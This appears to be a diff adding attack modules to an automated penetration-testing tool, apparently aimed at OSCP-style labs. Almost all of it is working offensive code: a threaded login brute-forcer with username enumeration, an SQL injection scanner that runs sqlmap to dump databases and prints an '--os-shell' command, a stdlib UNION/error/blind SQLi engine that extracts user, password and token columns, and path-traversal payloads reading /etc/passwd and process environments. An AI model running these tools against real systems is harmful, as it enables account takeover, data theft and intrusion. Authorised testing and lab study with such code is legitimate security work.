+    r"account.*(?:disabled|suspended|blocked)|exceeded|throttl", re.I)
+_BRUTE_DEADLINE = 600
+_BRUTE_THREADS = 4
+_BRUTE_REQ_TIMEOUT = 5
+_BRUTE_MAX_PASS = 200
+_BRUTE_PER_USER_CAP = 100
+_BRUTE_USER_ENUM_CAP = 40
+_BRUTE_LOCKOUT_PROBE = 5
+_BRUTE_MAX_TARGETS = 8
+
+
+def _pick_wordlist(cascade: list, builtin_desc: str, builtin: list) -> tuple:
+    """Generic first-available (multi-file merged) wordlist picker with a builtin fallback."""
+    for label, paths in cascade:
+        merged, seen = [], set()
+        for path in paths:
+            if not os.path.exists(path):
+                continue
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as fh:
+                    for ln in fh:
+                        w = ln.strip()
+                        if w and not w.startswith("#") and w not in seen:
+                            seen.add(w)
+                            merged.append(w)
+            except OSError:
+                continue
+        if merged:
+            return f"{label} ({', '.join(paths)})", merged
+    return builtin_desc, list(builtin)
+
+
+def _brute_enum_confirmed(ip: str, port: int, proto: str) -> set:
+    """(hostval, path) login surfaces where step 13 confirmed username enumeration works."""
+    s = set()
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "auth-bypass":
+            host = ip
+            for ln in output.splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                me = re.search(r"ENUM (\S+)", ln)
+                if me:
+                    s.add((host, me.group(1)))
+    return s
+
+
+def _tool_login_brute(ip: str, port: int, proto: str) -> str:
+    """HTTP step-14 tool: GATED login brute-force on Basic realms and HTML forms. Three gates
+    run first: (1) build a user list — enumerated via step-13's oracle where confirmed, else a
+    small unconfirmed shortlist; (2) a lockout probe (several wrong passwords) that ABORTS the
+    brute for a target if the account locks / rate-limits; (3) only then a capped, low-rate
+    password brute (per-user cap as a second guard). Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import base64
+    import random
+    import string
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_BRUTE_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(65536).decode("utf-8", "replace")
+            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), \
+                resp.headers.get("Location"), (resp.headers.get("WWW-Authenticate", "") or "")
+        except Exception:                                     # noqa: BLE001
+            return None, None, [], None, ""
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot brute")
+
+    def _submit_form(hostval, path, u, p):
+        g = _req(hostval, "GET", path)
+        if g[0] is None:
+            return None
+        form = _parse_login_form(g[1] or "", path)
+        if not form:
+            return None
+        data = dict(form["hidden"])
+        data[form["user"]] = u
+        data[form["pass"]] = p
+        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
+        pr = urllib.parse.urlparse(action)
+        apath = pr.path + (f"?{pr.query}" if pr.query else "")
+        cookie = "; ".join(c.split(";")[0] for c in g[2])
+        extra = {"Content-Type": "application/x-www-form-urlencoded"}
+        if cookie:
+            extra["Cookie"] = cookie
+        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)
+
+    def _try_basic(hostval, path, u, p):
+        tok = base64.b64encode(f"{u}:{p}".encode()).decode()
+        return _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})
+
+    def _attempt(authtype, hostval, path, u, p):
+        return _try_basic(hostval, path, u, p) if authtype == "Basic" else _submit_form(hostval, path, u, p)
+
+    def _names(setc):
+        return {c.split("=", 1)[0].strip() for c in setc}
+
+    def _success(authtype, cur, base):
+        if cur is None:
+            return False
+        st = cur[0]
+        if authtype == "Basic":
+            return st is not None and st != 401
+        if base is None:
+            return False
+        _st, body, sc, loc, _w = cur
+        fbody, fsc = base[1], base[2]
+        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
+            return True
+        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
+            return True
+        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
+            return True
+        new = _names(sc) - _names(fsc)
+        if new and not _CREDS_ERR_RE.search(body or "") and \
+                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
+            return True
+        return False
+
+    def _sig(r):
+        if r is None:
+            return None
+        st, body = r[0], r[1]
+        em = _CREDS_ERR_RE.search(body or "")
+        return st, len(body or ""), (em.group(0).lower() if em else None)
+
+    def _differs(a, b):
+        if a[0] != b[0] or a[2] != b[2]:
+            return True
+        return abs(a[1] - b[1]) > max(64, int(b[1] * 0.05))
+
+    def _rnduser():
+        return "nx" + "".join(random.choices(string.ascii_lowercase, k=9))
+
+    _ulabel, user_wl = _pick_wordlist(_BRUTE_USER_WORDLISTS, f"builtin ({len(_BRUTE_USER_BUILTIN)})",
+                                      _BRUTE_USER_BUILTIN)
+    plabel, pass_wl = _pick_wordlist(_BRUTE_PASS_WORDLISTS, f"builtin ({len(_BRUTE_PASS_BUILTIN)})",
+                                     _BRUTE_PASS_BUILTIN)
+    pass_wl = pass_wl[:_BRUTE_MAX_PASS]
+    enum_ok = _brute_enum_confirmed(ip, port, proto)
+    targets = _gather_login_targets(ip, port, proto)[:_BRUTE_MAX_TARGETS]
+
+    deadline = time.time() + _BRUTE_DEADLINE
+    stopped_deadline = [False]
+    attempts = [0]
+    a_lock = threading.Lock()
+    results = {}
+    r_lock = threading.Lock()
+
+    def _bump(n=1):
+        with a_lock:
+            attempts[0] += n
+
+    def _handle(hostval, path):
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            return
+        g = _req(hostval, "GET", path)
+        if g[0] is None:
+            return
+        if g[0] == 401 and "basic" in g[4].lower():
+            authtype = "Basic"
+        elif g[0] == 200 and _parse_login_form(g[1] or "", path):
+            authtype = "form"
+        else:
+            return
+        out = []
+
+        # failure baseline (for form success detection) + invalid enum signature
+        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=9))
+        fbase = _attempt(authtype, hostval, path, _rnduser(), wrongpw)
+        _bump()
+
+        # ── gate 1: user list ──────────────────────────────────────────────
+        users, ulabel = [], "unconfirmed shortlist"
+        if authtype == "form" and (hostval, path) in enum_ok:
+            inv_sig = _sig(fbase)
+            for cand in user_wl[:_BRUTE_USER_ENUM_CAP]:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    break
+                s = _sig(_attempt(authtype, hostval, path, cand, wrongpw))
+                _bump()
+                if s and inv_sig and _differs(s, inv_sig):
+                    users.append(cand)
+                if len(users) >= 10:
+                    break
+            if users:
+                ulabel = "enum-confirmed"
+        if not users:
+            users = ["admin", "administrator", "root", "user"]
+        out.append(f"  users ({ulabel}): {', '.join(users)}")
+
+        # ── gate 2: lockout probe ──────────────────────────────────────────
+        probe_user = users[0]
+        locked = False
+        for _ in range(_BRUTE_LOCKOUT_PROBE):
+            if time.time() >= deadline:
+                stopped_deadline[0] = True
+                break
+            r = _attempt(authtype, hostval, path, probe_user,
+                         "wx" + "".join(random.choices(string.ascii_letters, k=8)))
+            _bump()
+            if r and (r[0] == 429 or _BRUTE_LOCKOUT_RE.search(r[1] or "")):
+                locked = True
+                break
+        if locked:
+            out.append(f"  ⚠ LOCKOUT {path} — brute skipped (gate)")
+            with r_lock:
+                results.setdefault(hostval, []).extend(out)
+            return
+
+        # ── gate 3: capped, low-rate password brute ────────────────────────
+        for u in users:
+            if time.time() >= deadline:
+                stopped_deadline[0] = True
+                break
+            cracked = None
+            for i, pw in enumerate(pass_wl):
+                if i >= _BRUTE_PER_USER_CAP or time.time() >= deadline:
+                    if time.time() >= deadline:
+                        stopped_deadline[0] = True
+                    break
+                cur = _attempt(authtype, hostval, path, u, pw)
+                _bump()
+                if cur and cur[0] == 429:        # rate-limited mid-brute → stop this user
+                    break
+                if _success(authtype, cur, fbase):
+                    cracked = pw
+                    break
+            if cracked is not None:
+                out.append(f"  ✗ CRACKED {u}:{cracked or '<blank>'} @ {path} ({authtype})")
+        with r_lock:
+            results.setdefault(hostval, []).extend(out)
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                hostval, path = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _handle(hostval, path)
+            finally:
+                q.task_done()
+
+    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_BRUTE_THREADS)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    reason = "deadline" if stopped_deadline[0] else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ targeted login brute-force",
+             f"password list: {plabel} (capped {len(pass_wl)}) · attempts {attempts[0]} · {reason}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            lines += results[hostval]
+    else:
+        lines.append("\nno login surfaces to brute")
+    if not any("CRACKED" in ln for grp in results.values() for ln in grp):
+        lines.append("\n(no credentials brute-forced)")
+    return "\n".join(lines)
+
+
+# non-destructive SQLi detection payloads (SELECT/AND/SLEEP only — never DROP/DELETE/UPDATE)
+_SQLI_ERR_PAYLOADS = ["'", "\"", "')", "\\"]
+_SQLI_DBMS_SIG = [
+    ("mysql", r"you have an error in your sql syntax|warning:\s*mysqli?_|MySQL server version|valid MySQL"),
+    ("postgresql", r"PostgreSQL.*?ERROR|pg_query|unterminated quoted string"),
+    ("mssql", r"SQL Server|System\.Data\.SqlClient|unclosed quotation mark|ODBC SQL Server"),
+    ("oracle", r"ORA-\d{5}|quoted string not properly terminated"),
+    ("sqlite", r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|syntax error"),
+]
+_SQLI_BOOL = [
+    ("' AND '1'='1", "' AND '1'='2"),
+    ('" AND "1"="1', '" AND "1"="2'),
+    (" AND 1=1", " AND 1=2"),
+    (" AND 1=1-- -", " AND 1=2-- -"),
+]
+_SQLI_TIME = [   # (dbms, sleep-5 template, control template)
+    ("mysql", "' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
+    ("mysql", '" AND SLEEP({n})-- -', '" AND SLEEP(0)-- -'),
+    ("mysql", " AND SLEEP({n})", " AND SLEEP(0)"),
+    ("postgresql", "' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -", "' AND 0=(SELECT 0)-- -"),
+    ("mssql", "'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
+]
+_SQLI_DEADLINE = 300
+_SQLI_THREADS = 6
+_SQLI_REQ_TIMEOUT = 10
+_SQLI_TIME_DELAY = 5
+_SQLI_MAX_PARAMS = 30
+_SQLI_MAX_TIME_PARAMS = 12
+_SQLI_MAX_SQLMAP = 3
+_SQLI_SQLMAP_TIMEOUT = 180
+
+
+def _gather_sqli_targets(ip: str, port: int, proto: str) -> list:
+    """(hostval, path, param) to test — the params step 11 confirmed, else common params on
+    dynamic endpoints mined earlier."""
+    tg, seen = [], set()
+
+    def _add(host, path, param):
+        if (host, path, param) not in seen:
+            seen.add((host, path, param))
+            tg.append((host, path, param))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "param-hunt":
+            host = ip
+            for ln in output.splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mm = re.match(r"\s+(\S+?)\?\[([^\]]+)\]", ln)
+                if mm:
+                    for p in mm.group(2).split(","):
+                        if p.strip():
+                            _add(host, mm.group(1), p.strip())
+    if not tg:
+        for host, path in _gather_param_endpoints(ip, port, proto):
+            for p in ("id", "page", "cat", "file", "q", "user", "item", "pid", "view"):
+                _add(host, path, p)
+    return tg[:_SQLI_MAX_PARAMS]
+
+
+def _tool_sqli_scan(ip: str, port: int, proto: str) -> str:
+    """HTTP step-15 tool: detect SQLi on discovered params (error / boolean-blind / time-blind,
+    stdlib, non-destructive) and then run sqlmap --batch on the confirmed points for enumeration
+    + a BOUNDED dump (current DB, capped rows). os-shell / file-read are NOT auto — a ready
+    command is printed instead. Stdlib detection; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import urllib.parse
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval, path, param, value):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        t0 = time.perf_counter()
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_SQLI_REQ_TIMEOUT)
+            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            body = resp.read(65536).decode("utf-8", "replace")
+            return resp.status, body, time.perf_counter() - t0
+        except Exception:                                     # noqa: BLE001
+            return None, None, time.perf_counter() - t0
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _probe(ip, "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test SQLi")
+
+    targets = _gather_sqli_targets(ip, port, proto)
+    deadline = time.time() + _SQLI_DEADLINE
+    stopped = [False]
+    confirmed = []            # (host, path, param, [techniques], dbms|None)
+    time_candidates = []
+    lock = threading.Lock()
+
+    def _detect_fast(host, path, param):
+        if time.time() >= deadline:
+            stopped[0] = True
+            return
+        b_st, b_body, _ = _probe(host, path, param, "1")
+        if b_st is None:
+            return
+        b_len = len(b_body or "")
+        techs, dbms = [], None
+        # error-based
+        for pl in _SQLI_ERR_PAYLOADS:
+            st, body, _ = _probe(host, path, param, "1" + pl)
+            if body and _SQL_ERROR_RE.search(body):
+                techs.append("error")
+                for nm, rx in _SQLI_DBMS_SIG:
+                    if re.search(rx, body, re.I):
+                        dbms = nm
+                        break
+                break
+        # boolean-blind
+        for tpl, fpl in _SQLI_BOOL:
+            rt = _probe(host, path, param, "1" + tpl)
+            rf = _probe(host, path, param, "1" + fpl)
+            if rt[0] and rf[0] and not _SQL_ERROR_RE.search(rt[1] or "") and \
+                    not _SQL_ERROR_RE.search(rf[1] or ""):
+                lt, lf = len(rt[1] or ""), len(rf[1] or "")
+                if abs(lt - b_len) <= max(48, int(b_len * 0.02)) and \
+                        abs(lt - lf) > max(80, int(lt * 0.05)):
+                    techs.append("boolean")
+                    break
+        if techs:
+            with lock:
+                confirmed.append([host, path, param, techs, dbms])
+        else:
+            with lock:
+                time_candidates.append((host, path, param))
+
+    q = _queue.Queue()
+    for t in targets:
+        q.put(t)
+
+    def _worker():
+        while True:
+            try:
+                host, path, param = q.get_nowait()
+            except _queue.Empty:
+                return
+            try:
+                _detect_fast(host, path, param)
+            finally:
+                q.task_done()
+
+    ths = [threading.Thread(target=_worker, daemon=True) for _ in range(_SQLI_THREADS)]
+    for t in ths:
+        t.start()
+    for t in ths:
+        t.join()
+
+    # time-based: sequential (timing-sensitive), capped, only on not-yet-confirmed params
+    for host, path, param in time_candidates[:_SQLI_MAX_TIME_PARAMS]:
+        if time.time() >= deadline:
+            stopped[0] = True
+            break
+        lat = min(_probe(host, path, param, "1")[2], _probe(host, path, param, "1")[2])
+        for nm, ttpl, ctpl in _SQLI_TIME:
+            _s, _b, c_el = _probe(host, path, param, "1" + ctpl)
+            _s, _b, t_el = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
+            if t_el >= _SQLI_TIME_DELAY * 0.7 and (t_el - max(lat, c_el)) >= _SQLI_TIME_DELAY * 0.6:
+                _s, _b, t2 = _probe(host, path, param, "1" + ttpl.format(n=_SQLI_TIME_DELAY))
+                if t2 >= _SQLI_TIME_DELAY * 0.7:
+                    confirmed.append([host, path, param, ["time"], nm])
+                    break
+
+    # sqlmap: enumerate + bounded dump on the confirmed points (capped)
+    exe = shutil.which("sqlmap")
+    sqlmap_out = {}
+    for pt in confirmed[:_SQLI_MAX_SQLMAP]:
+        host, path, param, _techs, dbms = pt
+        url = f"{scheme}://{ip}:{port}{path}?{param}=1"
+        if not exe:
+            continue
+        cmd = [exe, "-u", url, "-p", param, "--batch", "--level", "3", "--risk", "2",
+               "--banner", "--current-user", "--current-db", "--dbs", "--tables", "--dump",
+               "--start", "1", "--stop", "20", "--time-sec", str(_SQLI_TIME_DELAY),
+               "--threads", "4", "--flush-session", "--disable-coloring"]
+        if dbms:
+            cmd += ["--dbms", dbms]
+        if host != ip:
+            cmd += ["--headers", f"Host: {host}"]
+        try:
+            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=_SQLI_SQLMAP_TIMEOUT)
+            sqlmap_out[(host, path, param)] = proc.stdout or proc.stderr or ""
+        except subprocess.TimeoutExpired:
+            sqlmap_out[(host, path, param)] = "__timeout__"
+
+    def _sqlmap_summary(out):
+        if out == "__timeout__":
+            return ["sqlmap: timed out (partial)"]
+        if not out:
+            return []
+        s = []
+        for label, rx in (("dbms", r"back-end DBMS:\s*(.+)"),
+                          ("user", r"current user:\s*'([^']+)'"),
+                          ("db", r"current database:\s*'([^']+)'")):
+            m = re.search(rx, out)
+            if m:
+                s.append(f"{label}: {m.group(1).strip()}")
+        mdb = re.search(r"available databases \[\d+\]:\n((?:\s*\[\*\] \S+\n?)+)", out)
+        if mdb:
+            dbs = re.findall(r"\[\*\] (\S+)", mdb.group(1))
+            s.append(f"dbs: {', '.join(dbs[:8])}")
+        if re.search(r"\[INFO\] table '.*?' dumped|Database:.*?\n\s*Table:", out) or \
+                re.search(r"^\|.*\|$", out, re.M):
+            s.append("dumped: yes")
+        return s
+
+    lines = [f"{scheme}://{ip}:{port}/ SQLi scan (stdlib detect + sqlmap)",
+             f"params tested: {len(targets)} · injectable {len(confirmed)} · "
+             f"sqlmap: {'ran' if exe else 'NOT INSTALLED — commands below'} · "
+             f"{'deadline' if stopped[0] else 'complete'}"]
+    if confirmed:
+        by_host = {}
+        for host, path, param, techs, dbms in confirmed:
+            by_host.setdefault(host, []).append((path, param, techs, dbms))
+        for host in sorted(by_host):
+            lines.append(f"\n[{host}{' [default]' if host == ip else ''}]")
+            for path, param, techs, dbms in by_host[host]:
+                tag = ", ".join(techs) + (f"; {dbms}" if dbms else "")
+                lines.append(f"  ✗ SQLI {path}?{param}  ({tag})")
+                for s in _sqlmap_summary(sqlmap_out.get((host, path, param), "")):
+                    lines.append(f"      {s}")
+                url = f"{scheme}://{ip}:{port}{path}?{param}=1"
+                hh = f" --headers='Host: {host}'" if host != ip else ""
+                lines.append(f"      RCE/file (manual): sqlmap -u '{url}'{hh} -p {param} "
+                             f"--batch --os-shell   # or --file-read=/etc/passwd")
+    else:
+        lines.append("\nno SQL injection found")
+    return "\n".join(lines)
+
+
+# OSCP-safe SQLi engine (no sqlmap / no external tool): breakout contexts, MySQL-first.
+_SQLI_CTX = [("num", "1 "), ("sq", "1' "), ("dq", '1" '), ("sqp", "1') "), ("dqp", '1") ')]
+_SQLI_DUMP_ERR = re.compile(
+    r"SQL syntax|Unknown column|mysql_|valid MySQL|ORA-\d{5}|PostgreSQL|SQL Server|"
+    r"sqlite|Warning|error in your|supplied argument|Query failed", re.I)
+_SQLI_INTERESTING_TBL = re.compile(
+    r"user|admin|account|member|login|credential|pass|auth|customer|staff|employee|flag|"
+    r"secret|config|setting|session|token|key|private|cred", re.I)
+_SQLI_INTERESTING_COL = re.compile(
+    r"user|name|email|login|pass|pwd|hash|secret|token|key|role|admin|flag", re.I)
+_SQLI_DUMP_MAX_TARGETS = 8
+_SQLI_DUMP_MAX_COLS = 12
+_SQLI_DUMP_ROWS = 15
+_SQLI_DUMP_TABLES = 6
+_SQLI_DUMP_DEADLINE = 300
+_SQLI_DUMP_BLIND_MAXLEN = 64
+
+
+def _tool_sqli_dump(ip: str, port: int, proto: str) -> str:
+    """HTTP step tool (OSCP-safe, NO sqlmap / no external tool): a stdlib SQLi extraction
+    engine. Finds the injection context, then extracts real data — UNION-based (fast: version,
+    user, db, tables, columns, bounded row dump), error-based (extractvalue windows) or, for
+    short scalars only, boolean-blind (binary search). MySQL-first. Non-destructive; dead → raises."""
+    import http.client
+    import ssl
+    import time
+    import urllib.parse
+    import random
+    import string
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+    deadline = time.time() + _SQLI_DUMP_DEADLINE
+
+    def _hx(s):
+        return "0x" + s.encode().hex()
+
+    def _get(hostval, path, param, value):
+        conn = None
+        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=10, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=10)
+            conn.request("GET", q, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            return resp.status, resp.read(200000).decode("utf-8", "replace")
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    def _engine(hostval, path, param):
+        def g(v):
+            return _get(hostval, path, param, v)
+
+        base_st, base_body = g("1")
+        if base_st is None:
+            return None
+        base_len = len(base_body or "")
+
+        def broken(body, st):
+            return (st is not None and st >= 500) or bool(_SQLI_DUMP_ERR.search(body or "")) or \
+                abs(len(body or "") - base_len) > max(200, int(base_len * 0.5))
+
+        # ── try UNION primitive across contexts ────────────────────────────
+        mark = "".join(random.choices(string.ascii_lowercase, k=6))
+        for cname, pre in _SQLI_CTX:
+            if time.time() >= deadline:
+                return None
+            r1 = g(pre + "ORDER BY 1-- -")
+            if r1[0] is None or broken(r1[1], r1[0]):
+                continue
+            cols = 1
+            for n in range(2, _SQLI_DUMP_MAX_COLS + 1):
+                rn = g(pre + f"ORDER BY {n}-- -")
+                if broken(rn[1], rn[0]):
+                    break
+                cols = n
+            slots = [_hx(f"{mark}{j}{mark}") for j in range(cols)]
+            ru = g(pre + "UNION SELECT " + ",".join(slots) + "-- -")
+            refl = None
+            for j in range(cols):
+                if f"{mark}{j}{mark}" in (ru[1] or ""):
+                    refl = j
+                    break
+            if refl is None:
+                continue
+
+            def ux(expr):
+                sl = ["NULL"] * cols
+                sl[refl] = f"concat({_hx(mark)},({expr}),{_hx(mark)})"
+                r = g(pre + "UNION SELECT " + ",".join(sl) + "-- -")
+                m = re.search(re.escape(mark) + r"(.*?)" + re.escape(mark), r[1] or "", re.S)
+                return m.group(1) if m else None
+
+            return _harvest("UNION", cname, cols, refl, ux)
+
+        # ── error-based primitive (MySQL extractvalue) ─────────────────────
+        for cname, pre in _SQLI_CTX:
+            if time.time() >= deadline:
+                return None
+            probe = g(pre + "AND extractvalue(1,concat(0x7e,0x6b716b))-- -")
+            if probe[0] and re.search(r"XPATH syntax error: '~?kqk", probe[1] or ""):
+                def ex(expr):
+                    out, off = "", 1
+                    while off < 512 and time.time() < deadline:
+                        r = g(pre + f"AND extractvalue(1,concat(0x7e,mid(({expr}),{off},31)))-- -")
+                        m = re.search(r"XPATH syntax error: '~(.*?)'", r[1] or "")
+                        chunk = m.group(1) if m else ""
+                        if not chunk:
+                            break
+                        out += chunk
+                        if len(chunk) < 31:
+                            break
+                        off += 31
+                    return out or None
+                return _harvest("error", cname, None, None, ex)
+
+        # ── boolean-blind primitive (scalars only) ─────────────────────────
+        for cname, pre in _SQLI_CTX:
+            if time.time() >= deadline:
+                return None
+            tr = g(pre + "AND 1=1-- -")
+            fa = g(pre + "AND 1=2-- -")
+            if not (tr[0] and fa[0]):
+                continue
+            lt, lf = len(tr[1] or ""), len(fa[1] or "")
+            if abs(lt - base_len) <= max(48, int(base_len * 0.02)) and abs(lt - lf) > max(64, int(lt * 0.05)):
+                def is_true(cond):
+                    r = g(pre + f"AND ({cond})-- -")
+                    return r[0] is not None and abs(len(r[1] or "") - lt) <= max(48, int(lt * 0.02))
+
+                def bx(expr, maxlen=_SQLI_DUMP_BLIND_MAXLEN):
+                    L = 0
+                    for n in range(1, maxlen + 1):
+                        if time.time() >= deadline:
+                            break
+                        if is_true(f"length(({expr}))>={n}"):
+                            L = n
+                        else:
+                            break
+                    s = ""
+                    for i in range(1, L + 1):
+                        if time.time() >= deadline:
+                            break
+                        lo, hi = 32, 126
+                        while lo < hi:
+                            md = (lo + hi) // 2
+                            if is_true(f"ascii(substring(({expr}),{i},1))>{md}"):
+                                lo = md + 1
+                            else:
+                                hi = md
+                        s += chr(lo)
+                    return s or None
+                return _harvest("boolean", cname, None, None, bx, scalars_only=True)
+        return None
+
+    def _harvest(technique, cname, cols, refl, xf, scalars_only=False):
+        info = {"technique": technique, "ctx": cname, "cols": cols, "refl": refl, "rows": []}
+        info["version"] = xf("@@version")
+        info["user"] = xf("current_user()")
+        info["db"] = xf("database()")
+        if scalars_only:
+            return info
+        tbls = xf("(SELECT group_concat(table_name SEPARATOR 0x2c) FROM "
+                  "information_schema.tables WHERE table_schema=database())")
+        tables = [t for t in (tbls or "").split(",") if t][:40]
+        info["tables"] = tables
+        pick = [t for t in tables if _SQLI_INTERESTING_TBL.search(t)] or tables
+        for tname in pick[:_SQLI_DUMP_TABLES]:
+            if time.time() >= deadline:
+                break
+            cnames = xf("(SELECT group_concat(column_name SEPARATOR 0x2c) FROM "
+                        f"information_schema.columns WHERE table_schema=database() AND table_name={_hx(tname)})")
+            columns = [c for c in (cnames or "").split(",") if c]
+            if not columns:
+                continue
+            want = [c for c in columns if _SQLI_INTERESTING_COL.search(c)] or columns[:3]
+            want = want[:4]
+            expr = ("(SELECT group_concat(concat_ws(0x7c," + ",".join(want) +
+                    f") SEPARATOR 0x0a) FROM {tname} LIMIT {_SQLI_DUMP_ROWS})")
+            rows = xf(expr)
+            info["rows"].append((tname, want, [r for r in (rows or "").split("\n") if r]))
+        return info
+
+    targets = _gather_sqli_targets(ip, port, proto)[:_SQLI_DUMP_MAX_TARGETS]
+    if _get(ip, "/", "x", "1")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot dump")
+
+    results = {}
+    for hostval, path, param in targets:
+        if time.time() >= deadline:
+            break
+        info = _engine(hostval, path, param)
+        if info:
+            results.setdefault(hostval, []).append((path, param, info))
+
+    lines = [f"{scheme}://{ip}:{port}/ SQLi auto-dump (OSCP-safe, no sqlmap)",
+             f"targets: {len(targets)} · extracted {sum(len(v) for v in results.values())} · "
+             f"{'deadline' if time.time() >= deadline else 'complete'}"]
+    if results:
+        for hostval in sorted(results):
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            for path, param, info in results[hostval]:
+                tag = info["technique"] + (f", {info['cols']} cols, col#{info['refl'] + 1}"
+                                           if info["cols"] else "")
+                lines.append(f"  ✗ {path}?{param}  ({tag})")
+                if info.get("version"):
+                    lines.append(f"      version: {info['version']}")
+                idl = " · ".join(x for x in (f"user: {info['user']}" if info.get("user") else "",
+                                             f"db: {info['db']}" if info.get("db") else "") if x)
+                if idl:
+                    lines.append(f"      {idl}")
+                if info.get("tables"):
+                    lines.append(f"      tables: {', '.join(info['tables'][:15])}")
+                for tname, cols_, rows in info.get("rows", []):
+                    lines.append(f"      {tname} ({','.join(cols_)}):")
+                    lines += [f"        {r}" for r in rows[:_SQLI_DUMP_ROWS]]
+    else:
+        lines.append("\nno SQL injection extracted")
+    return "\n".join(lines)
+
+
+# LFI / path traversal — file-like param names, read-only payloads, content-verified.
+_LFI_FILE_PARAM = re.compile(
+    r"file|page|path|include|inc|template|tpl|doc|document|view|lang|dir|load|read|"
+    r"download|content|src|url|cat", re.I)
+_LFI_PASSWD = ["/etc/passwd"] + ["../" * d + "etc/passwd" for d in range(1, 9)] + [
+    "....//" * 6 + "etc/passwd",
+    "..%2f" * 6 + "etc%2fpasswd",
+    "..%252f" * 6 + "etc%252fpasswd",
+    "/etc/passwd%00", "../" * 6 + "etc/passwd%00",
+    "php://filter/resource=/etc/passwd",
+]
+_LFI_WIN = ["..\\" * 6 + "windows\\win.ini", "..%5c" * 6 + "windows%5cwin.ini",
+            "C:\\windows\\win.ini"]
+_LFI_ENVIRON = ["/proc/self/environ", "../" * 6 + "proc/self/environ"]
+_LFI_PHPSRC = ["php://filter/convert.base64-encode/resource=index.php",
+               "php://filter/read=convert.base64-encode/resource=index.php",
+               "php://filter/convert.base64-encode/resource=index"]
+_LFI_SIG_PASSWD = re.compile(r"^[a-zA-Z_][\w.-]*:[^:\n]*:\d+:\d+:", re.M)
+_LFI_SIG_WIN = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
+_LFI_SIG_ENVIRON = re.compile(r"PATH=|HTTP_HOST=|DOCUMENT_ROOT=|SERVER_SOFTWARE=")
+_LFI_DEADLINE = 180
+_LFI_THREADS = 8
